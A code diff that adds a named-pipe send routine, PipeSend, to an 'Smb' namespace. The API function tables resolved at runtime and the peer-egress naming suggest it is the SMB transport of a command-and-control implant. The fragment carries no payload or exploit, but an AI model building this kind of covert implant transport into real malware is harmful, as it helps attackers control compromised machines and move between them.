@@ -379,20 +379,37 @@ namespace Smb {
         return true;
     }
 
-    BOOL MoveFilePointer(HANDLE handle, int32_t offset, int32_t *current) {
+    BOOL PipeSend (_stream *out) {
         HEXANE
 
-        *current += offset;
-        if (!Ctx->win32.SetFilePointer(handle, *current, nullptr, FILE_BEGIN)) {
-            return false;
+        SMB_PIPE_SEC_ATTR smb_sec_attr  = { };
+        SECURITY_ATTRIBUTES sec_attr    = { };
+        bool success                    = true;
+
+        if (!Ctx->transport.pipe_handle) {
+            SmbContextInit(&smb_sec_attr, &sec_attr);
+
+            if (!(Ctx->transport.pipe_handle = Ctx->win32.CreateNamedPipeW(Ctx->transport.pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
+                success_(false);
+            }
+
+            SmbContextDestroy(&smb_sec_attr);
+
+            if (!Ctx->win32.ConnectNamedPipe(Ctx->transport.pipe_handle, nullptr)) {
+                Ctx->nt.NtClose(Ctx->transport.pipe_handle);
+                success_(false);
+            }
         }
 
-        return true;
-    }
+        if (!PipeWrite(Ctx->transport.pipe_handle, out)) {
+            if (ntstatus == ERROR_NO_DATA) {
+                Ctx->nt.NtClose(Ctx->transport.pipe_handle);
+            }
+            success_(false);
+        }
 
-    VOID PipeSend (_stream *out) {
-        HEXANE
-
+        defer:
+        return success;
     }
 
     VOID PeerConnectEgress(_stream *out, _stream **in) {
